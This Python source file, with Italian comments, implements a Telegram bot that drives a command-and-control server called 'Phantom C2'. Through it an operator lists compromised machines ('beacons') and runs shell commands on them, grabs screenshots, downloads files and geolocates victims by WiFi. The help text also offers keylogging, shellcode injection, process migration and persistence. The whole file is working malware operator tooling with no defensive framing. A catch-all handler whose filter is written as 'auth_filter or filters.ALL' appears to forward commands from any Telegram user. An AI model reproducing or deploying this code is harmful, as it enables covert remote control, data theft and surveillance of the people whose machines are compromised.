"""
Telegram C2 bot — gestisci beacon da mobile via Telegram.
Richiede: pip install python-telegram-bot

Setup: @BotFather → /newbot → salva token in PHANTOM_TELEGRAM_BOT_TOKEN nel .env

Comandi:
  /start          — info bot e beacon attivi
  /beacons        — lista beacon con stato
  /interact <id>  — seleziona beacon per comandi
  /sysinfo        — sysinfo del beacon attivo
  /whoami         — whoami
  /pwd            — directory corrente
  /ls [path]      — listing directory
  /shell <cmd>    — esegui comando shell
  /screenshot     — screenshot (torna base64 via file Telegram)
  /results        — risultati in attesa
  /exit           — deseleziona beacon
"""

from __future__ import annotations

import os
import json
import base64
import time
import threading
import logging
import urllib.request
from datetime import datetime
from io import BytesIO

logger = logging.getLogger(__name__)

# Load .env BEFORE reading any env var — guarantees BOT_TOKEN is available
# even when load_dotenv() hasn't been called yet by c2_server
from dotenv import load_dotenv
load_dotenv()

from phantom.utils.c2_helpers import format_beacon_output as _format_beacon_output

try:
    from telegram import Update, Bot
    from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, CallbackContext, filters
    TELEGRAM_AVAILABLE = True
except ImportError:
    TELEGRAM_AVAILABLE = False

BOT_TOKEN = os.getenv("PHANTOM_TELEGRAM_BOT_TOKEN", "")
C2_API = os.getenv("PHANTOM_C2_API", "http://127.0.0.1:8080")
ALLOWED_USERS = set()
_allowed_str = os.getenv("PHANTOM_TELEGRAM_ALLOWED_USERS", "").strip()
if _allowed_str:
    ALLOWED_USERS = set(int(x.strip()) for x in _allowed_str.split(",") if x.strip())

active_beacon = None
bot_app = None
_bot_thread = None

from phantom.utils.c2_crypto import get_api_token
API_TOKEN = get_api_token()

def _headers():
    h = {"Content-Type": "application/json"}
    if API_TOKEN:
        h["X-Api-Token"] = API_TOKEN
    return h


def _api_get(path):
    try:
        req = urllib.request.Request(C2_API + path, headers=_headers())
        r = urllib.request.urlopen(req, timeout=30)
        return json.loads(r.read())
    except Exception:
        return None


def _api_post(path, data):
    try:
        body = json.dumps(data).encode()
        req = urllib.request.Request(C2_API + path, data=body, headers=_headers(), method="POST")
        r = urllib.request.urlopen(req, timeout=30)
        return json.loads(r.read())
    except Exception:
        return None


def _wait_result(bid, initial, timeout=120):
    deadline = datetime.now().timestamp() + timeout
    while datetime.now().timestamp() < deadline:
        r = _api_get(f"/api/v1/results?beacon_id={bid}")
        if r and len(r.get("results", [])) > initial:
            return r["results"][-1]["output"]
        time.sleep(0.5)
    return "[timeout]"


async def _cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    beacons = _api_get("/api/v1/beacons")
    n = len(beacons) if beacons else 0
    await update.message.reply_text(
        f"Phantom C2 Bot 🤖\nBeacon attivi: {n}\n\n"
        "/beacons — lista\n/interact &lt;id&gt; — seleziona\n"
        "/help — tutti i comandi"
    )


def _get_beacon_list() -> tuple[dict, list]:
    """Return (beacons_dict, ordered_list_of_ids)."""
    beacons = _api_get("/api/v1/beacons")
    if not beacons:
        return {}, []
    ids = sorted(beacons.keys())
    return beacons, ids


async def _cmd_beacons(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    beacons, ids = _get_beacon_list()
    if not ids:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    lines = []
    for i, bid in enumerate(ids, 1):
        info = beacons[bid]
        os_ = info.get("os", "?")[:20]
        ip = info.get("ip", "?")
        user = info.get("user", "?")
        last = info.get("last_seen", "?")
        sel = " ⬅️" if bid == active_beacon else ""
        lines.append(f"[{i}] `{bid[:30]}...`{sel}\n  {os_} | {ip} | {user}\n  last: {last}")
    await update.message.reply_text("\n\n".join(lines))


async def _cmd_interact(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global active_beacon
    beacons, ids = _get_beacon_list()
    if not ids:
        await update.message.reply_text("Nessun beacon attivo.")
        return

    if not ctx.args:
        # Nessun argomento — mostra lista numerata
        lines = ["Beacon attivi. Scegli con /interact <numero>:\n"]
        for i, bid in enumerate(ids, 1):
            info = beacons[bid]
            sel = " ⬅️" if bid == active_beacon else ""
            lines.append(f"[{i}] {info.get('user','?')}@{info.get('hostname','?')}{sel}")
            lines.append(f"    {info.get('os','?')[:30]} | {info.get('ip','?')}")
        await update.message.reply_text("\n".join(lines))
        return

    bid_arg = ctx.args[0]

    # Se è un numero, seleziona per indice
    if bid_arg.isdigit():
        idx = int(bid_arg) - 1
        if idx < 0 or idx >= len(ids):
            await update.message.reply_text(f"Numero invalido. Usa 1-{len(ids)}.")
            return
        bid = ids[idx]
    else:
        # Match per ID parziale
        if bid_arg in beacons:
            bid = bid_arg
        else:
            match = [b for b in ids if b.startswith(bid_arg)]
            if not match:
                await update.message.reply_text("Beacon non trovato. Usa /beacons per la lista.")
                return
            bid = match[0]

    active_beacon = bid
    info = beacons[bid]
    await update.message.reply_text(
        f"✅ Interacting with {bid[:30]}...\n"
        f"  {info.get('os', '?')} | {info.get('ip', '?')} | {info.get('user', '?')}"
    )


async def _cmd_exit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    global active_beacon
    active_beacon = None
    await update.message.reply_text("Beacon deselezionato.")


async def _cmd_results(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
        return
    r = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    if not r or not r.get("results"):
        await update.message.reply_text("Nessun risultato.")
        return
    out = r["results"][-1].get("output", "")
    await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_shell(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    if not ctx.args:
        await update.message.reply_text("Uso: /shell <comando>")
        return
    cmd = "shell " + " ".join(ctx.args)
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": cmd})
    out = _wait_result(active_beacon, n0)
    await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_screenshot(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": "screenshot"})
    out = _wait_result(active_beacon, n0)
    if not out:
        await update.message.reply_text("Timeout screenshot.")
        return
    if out.startswith("SCREENSHOT_B64:"):
        b64 = out[len("SCREENSHOT_B64:"):]
        try:
            data = base64.b64decode(b64)
            bio = BytesIO(data)
            bio.name = "screenshot.bmp"
            await update.message.reply_photo(bio)
        except Exception:
            await update.message.reply_text(f"Errore decode: {out[:200]}")
    else:
        await update.message.reply_text(f"```\n{out[:2000]}\n```")


async def _cmd_wlan_locate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
        return
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": "wlan-locate"})
    out = _wait_result(active_beacon, n0, timeout=30)
    await _format_and_reply(update, out)


async def _cmd_download(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo.")
        return
    if not ctx.args:
        await update.message.reply_text("Uso: /download <filepath>")
        return
    filepath = " ".join(ctx.args)
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": f"download {filepath}"})
    out = _wait_result(active_beacon, n0, timeout=30)
    if not out:
        await update.message.reply_text("Timeout download.")
        return
    if out.startswith("FILE_B64:"):
        b64 = out[len("FILE_B64:"):]
        try:
            data = base64.b64decode(b64)
            bio = BytesIO(data)
            bio.name = os.path.basename(filepath) or "file"
            await update.message.reply_document(bio)
        except Exception:
            await update.message.reply_text(f"Errore decode: {out[:200]}")
    else:
        await update.message.reply_text(f"```\n{out[:2000]}\n```")


async def _format_and_reply(update: Update, out: str):
    """Format beacon output and reply. Handles WLAN, screenshots, downloads."""
    if out.startswith("WLAN_GEOLOCATE:"):
        text, _ = _format_beacon_output(out)
        await update.message.reply_text(text)
    elif out.startswith("SCREENSHOT_B64:"):
        try:
            data = base64.b64decode(out[len("SCREENSHOT_B64:"):])
            bio = BytesIO(data)
            bio.name = "screenshot.bmp"
            await update.message.reply_photo(bio)
        except Exception:
            await update.message.reply_text(f"```\n{out[:2000]}\n```")
    elif out.startswith("FILE_B64:"):
        try:
            b64 = out[len("FILE_B64:"):]
            data = base64.b64decode(b64)
            bio = BytesIO(data)
            bio.name = "file"
            await update.message.reply_document(bio)
        except Exception:
            await update.message.reply_text(f"```\n{out[:2000]}\n```")
    else:
        await update.message.reply_text(f"```\n{out[:3000]}\n```")


async def _cmd_fallback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Catch-all: forward any unrecognized command to the beacon."""
    if not active_beacon:
        await update.message.reply_text("Nessun beacon attivo. Usa /interact")
        return
    cmd = update.message.text.lstrip("/")
    # Strip @botname if present
    if "@" in cmd.split(" ")[0]:
        parts = cmd.split(" ", 1)
        cmd_parts = parts[0].split("@")
        cmd = cmd_parts[0] + (" " + parts[1] if len(parts) > 1 else "")
    r0 = _api_get(f"/api/v1/results?beacon_id={active_beacon}")
    n0 = len(r0.get("results", [])) if r0 else 0
    _api_post("/api/v1/queue", {"beacon_id": active_beacon, "command": cmd})
    out = _wait_result(active_beacon, n0)
    await _format_and_reply(update, out)


async def _cmd_help(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    text = (
        "🤖 *Phantom C2 Bot*\n\n"
        "*Gestione:*\n"
        "/beacons — lista beacon\n"
        "/interact `<id>` — seleziona beacon\n"
        "/exit — deseleziona\n"
        "/results — risultati recenti\n\n"
        "*Comandi beacon:*\n"
        "/sysinfo — info sistema\n"
        "/whoami — utente\n"
        "/pwd — directory\n"
        "/cd `<path>` — cambio directory\n"
        "/ls `[path]` — listing\n"
        "/shell `<cmd>` — esegui comando\n"
        "/keylog `<start|stop|status|dump>` — keylogger\n"
        "/inject `<pid>` `<base64>` — inject shellcode\n"
        "/migrate `<base64>` — migra processo\n"
        "/screenshot — cattura schermo\n"
        "/download `<path>` — scarica file\n"
        "/wlan-locate — geolocalizzazione WiFi (torna link Maps)\n"
        "/persist — persistenza\n\n"
        "Qualsiasi altro comando non riconosciuto viene inviato direttamente al beacon."
    )
    await update.message.reply_text(text)


def _set_bot_commands(app):
    """Register command list with Telegram for autocomplete in chat."""
    try:
        import asyncio
        commands = [
            ("start", "Info bot e beacon attivi"),
            ("beacons", "Lista beacon con stato"),
            ("interact", "Seleziona beacon (o numero)"),
            ("exit", "Deseleziona beacon"),
            ("results", "Risultati recenti"),
            ("sysinfo", "Info sistema beacon"),
            ("whoami", "Utente beacon"),
            ("pwd", "Directory corrente"),
            ("cd", "Cambia directory"),
            ("ls", "Lista directory"),
            ("shell", "Esegui comando shell"),
            ("keylog", "Keylogger start/stop/status/dump"),
            ("wlan_locate", "Geolocalizzazione WiFi"),
            ("screenshot", "Cattura schermo"),
            ("download", "Scarica file"),
            ("persist", "Persistenza"),
            ("help", "Tutti i comandi"),
        ]
        async def _set():
            await app.bot.set_my_commands(commands)
        loop = asyncio.new_event_loop()
        loop.run_until_complete(_set())
        loop.close()
        logger.info("Bot commands registered with Telegram.")
    except Exception as e:
        logger.warning(f"Failed to register bot commands: {e}")


def start_bot():
    import asyncio
    global bot_app
    if not TELEGRAM_AVAILABLE:
        logger.error("python-telegram-bot non installato. pip install python-telegram-bot")
        return
    if not BOT_TOKEN:
        logger.error("PHANTOM_TELEGRAM_BOT_TOKEN non impostato nel .env")
        return

    try:
        app = Application.builder().token(BOT_TOKEN).build()
        bot_app = app

        auth_filter = filters.User(user_id=list(ALLOWED_USERS))
        allowed_count = len(ALLOWED_USERS)
        print(f"[Telegram] auth_filter applied. Allowed users: {allowed_count}")

        app.add_handler(CommandHandler("start", _cmd_start, filters=auth_filter))
        app.add_handler(CommandHandler("beacons", _cmd_beacons, filters=auth_filter))
        app.add_handler(CommandHandler("interact", _cmd_interact, filters=auth_filter))
        app.add_handler(CommandHandler("exit", _cmd_exit, filters=auth_filter))
        app.add_handler(CommandHandler("results", _cmd_results, filters=auth_filter))
        app.add_handler(CommandHandler("help", _cmd_help, filters=auth_filter))

        app.add_handler(CommandHandler("shell", _cmd_shell, filters=auth_filter))
        app.add_handler(CommandHandler("screenshot", _cmd_screenshot, filters=auth_filter))
        app.add_handler(CommandHandler("download", _cmd_download, filters=auth_filter))
        app.add_handler(CommandHandler("wlan_locate", _cmd_wlan_locate, filters=auth_filter))

        app.add_handler(MessageHandler(filters.COMMAND & (auth_filter or filters.ALL), _cmd_fallback))

        logger.info("Telegram bot avviato.")
        app.run_polling(allowed_updates=Update.ALL_TYPES, stop_signals=[], drop_pending_updates=True)
    except Exception as e:
        logger.error(f"Telegram bot error: {e}")
        print(f"[Telegram Bot] ERRORE: {e}")


def run():
    global _bot_thread
    if _bot_thread and _bot_thread.is_alive():
        print("[Telegram Bot] Già in esecuzione")
        return _bot_thread
    t = threading.Thread(target=start_bot, daemon=True)
    t.start()
    _bot_thread = t
    print("[Telegram Bot] Avviato in background")
    return t


if __name__ == "__main__":
    start_bot()
